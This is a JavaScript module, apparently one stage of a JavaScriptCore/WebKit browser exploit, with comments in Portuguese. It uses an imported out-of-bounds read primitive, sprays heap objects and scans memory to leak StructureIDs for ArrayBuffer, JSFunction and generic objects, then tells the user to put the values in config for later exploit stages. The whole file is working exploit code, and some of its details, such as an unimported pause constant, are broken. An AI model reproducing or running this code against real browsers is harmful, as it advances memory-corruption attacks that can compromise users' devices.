// js/script3/readStructureIDs.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const MAX_SPRAY_OBJS_FOR_ID_LEAK = 150;
const DEFAULT_AB_SIZE_FOR_ID_LEAK = 128;

async function findAndLogStructureIDInternal(objectFactory, objectTypeName, verificationLogicFn, logFn = logS3, currentAttempt = 0) {
    const FNAME = `findAndLogStructureIDInternal<${objectTypeName}>`;
    logFn(` Tentativa #${currentAttempt} para encontrar StructureID de: ${objectTypeName}`, "info", FNAME);

    if (!oob_array_buffer_real) {
        logFn("Ambiente OOB não configurado antes de chamar findAndLog. Abortando.", "error", FNAME);
        return null;
    }

    logFn(` Pulverizando ${MAX_SPRAY_OBJS_FOR_ID_LEAK} instâncias de ${objectTypeName}...`, "info", FNAME);
    let sprayedObjects = [];
    for (let i = 0; i < MAX_SPRAY_OBJS_FOR_ID_LEAK; i++) {
        try {
            sprayedObjects.push(objectFactory());
        } catch (e) { /* ignorar */ }
    }
    if (sprayedObjects.length === 0) {
        logFn(`Nenhum objeto ${objectTypeName} pulverizado.`, "warn", FNAME);
        return null;
    }
    await PAUSE_S3(200);

    let foundStructureID = null;
    const structureIdOffsetInCell = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);

    const searchStart = Math.max(0, (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - (DEFAULT_AB_SIZE_FOR_ID_LEAK * 10));
    const searchEnd = Math.min(oob_array_buffer_real.byteLength - 32, (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 0) + (DEFAULT_AB_SIZE_FOR_ID_LEAK * 10) );

    logFn(` Varrendo de ${toHex(searchStart)} a ${toHex(searchEnd)} dentro de oob_array_buffer_real (tamanho: ${toHex(oob_array_buffer_real.byteLength)})`, "info", FNAME);

    for (let candidateBaseAbsOffset = searchStart; candidateBaseAbsOffset < searchEnd; candidateBaseAbsOffset += 8) {
        try {
            const isObjectCandidate = await verificationLogicFn(candidateBaseAbsOffset, objectTypeName, logFn);
            if (isObjectCandidate) {
                let potentialID;
                try {
                    potentialID = oob_read_absolute(candidateBaseAbsOffset + structureIdOffsetInCell, 4, logFn);
                    if (potentialID !== 0 && potentialID !== 0xFFFFFFFF && (potentialID & 0xFF000000) !== 0xFF000000 ) {
                         foundStructureID = potentialID;
                    }
                } catch (e_direct_id) { /* ignora */ }

                if (foundStructureID) {
                     logFn(`   !!! StructureID (direto) VÁLIDO para ${objectTypeName} em ${toHex(candidateBaseAbsOffset)}: ${toHex(foundStructureID)} !!!`, "vuln", FNAME);
                     break;
                }
            }
        } catch (e_verify) { /* ignora */ }
        if (candidateBaseAbsOffset > searchStart && candidateBaseAbsOffset % (1024 * 50) === 0) {
            logFn(`   Varredura de ID em ${toHex(candidateBaseAbsOffset)}...`, "info", FNAME);
            await PAUSE_S3(10);
        }
    }
    sprayedObjects = null;
    return foundStructureID;
}

async function verifyArrayBufferAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const sizeOffsetInAB = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    try {
        const potentialSize = oob_read_absolute(baseAbsOffsetInOOB + sizeOffsetInAB, 4, logFn);
        if (potentialSize === DEFAULT_AB_SIZE_FOR_ID_LEAK) {
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            logFn(`  Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: Tamanho OK (${DEFAULT_AB_SIZE_FOR_ID_LEAK}). StructureID lido: ${toHex(structureID)}`, "info", `verifyAB_${typeName}`);
            return structureID; // Retornar o ID para ser verificado por `findAndLogStructureIDInternal`
        }
    } catch (e) { /* ignora */ }
    return null; // Indicar que não é um candidato válido ou não foi possível ler
}

async function verifyJSFunctionAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const executableOffset = parseInt(JSC_OFFSETS.JSFunction.M_EXECUTABLE_OFFSET, 16);
    try {
        const ptr = oob_read_absolute(baseAbsOffsetInOOB + executableOffset, 8, logFn);
        if (isAdvancedInt64Object(ptr) && (ptr.low() !== 0 || ptr.high() !== 0)) {
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            logFn(`  Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: ExecutablePtr OK. StructureID lido: ${toHex(structureID)}`, "info", `verifyFunc_${typeName}`);
            return structureID;
        }
    } catch (e) { /* ignora */ }
    return null;
}

async function verifyGenericJSObjectAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const butterflyOffset = parseInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 16);
    try {
        const ptr = oob_read_absolute(baseAbsOffsetInOOB + butterflyOffset, 8, logFn);
        if (isAdvancedInt64Object(ptr)) { // Butterfly pode ser nulo para objetos vazios, mas ainda é um ponteiro
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            logFn(`  Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: ButterflyPtr OK. StructureID lido: ${toHex(structureID)}`, "info", `verifyObj_${typeName}`);
            return structureID;
        }
    } catch (e) { /* ignora */ }
    return null;
}

export async function discoverStructureIDs() {
    const FNAME_MAIN = "discoverStructureIDs";
    logS3(`==== INICIANDO Descoberta de StructureIDs (S3) v1.2 ====`, "test", FNAME_MAIN);
    const results = {
        ArrayBuffer: null,
        JSFunction: null,
        JSObjectGeneric: null,
    };
    const MAX_GLOBAL_ATTEMPTS = 2;

    for (let attempt = 1; attempt <= MAX_GLOBAL_ATTEMPTS; attempt++) {
        logS3(`--- Tentativa Global de Descoberta #${attempt} ---`, "info", FNAME_MAIN);
        await triggerOOB_primitive(logS3);
        if (!oob_array_buffer_real) {
            logS3("Falha crítica ao configurar ambiente OOB. Abortando descoberta.", "error", FNAME_MAIN);
            return;
        }

        if (!results.ArrayBuffer) {
            results.ArrayBuffer = await findAndLogStructureIDInternal(() => new ArrayBuffer(DEFAULT_AB_SIZE_FOR_ID_LEAK), "ArrayBuffer", verifyArrayBufferAndReturnID, logS3, attempt);
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }

        if (!results.JSFunction) {
            results.JSFunction = await findAndLogStructureIDInternal(() => function() { return 1+1; }, "JSFunction", verifyJSFunctionAndReturnID, logS3, attempt);
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }

        if (!results.JSObjectGeneric) {
             results.JSObjectGeneric = await findAndLogStructureIDInternal(() => ({a:1, b:2}), "JSObjectGeneric", verifyGenericJSObjectAndReturnID, logS3, attempt);
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }

        clearOOBEnvironment();
        if (Object.values(results).every(val => val !== null)) {
            logS3("Todos os StructureIDs alvo foram encontrados.", "good", FNAME_MAIN);
            break;
        }
        if (attempt < MAX_GLOBAL_ATTEMPTS) await PAUSE_S3(LONG_PAUSE_S3);
    }

    logS3("--- Resultados Finais da Descoberta de StructureIDs ---", "test", FNAME_MAIN);
    for (const typeName in results) {
        if (results[typeName] !== null && results[typeName] !== undefined) {
            logS3(`  ${typeName}: ${toHex(results[typeName])}`, "good", FNAME_MAIN);
        } else {
            logS3(`  ${typeName}: Não encontrado ou inválido`, "warn", FNAME_MAIN);
        }
    }
    logS3("PREENCHA OS VALORES ENCONTRADOS EM KNOWN_STRUCTURE_IDS NO SEU config.mjs!", "critical", FNAME_MAIN);
    logS3(`==== Descoberta de StructureIDs CONCLUÍDA ====`, "test", FNAME_MAIN);
}
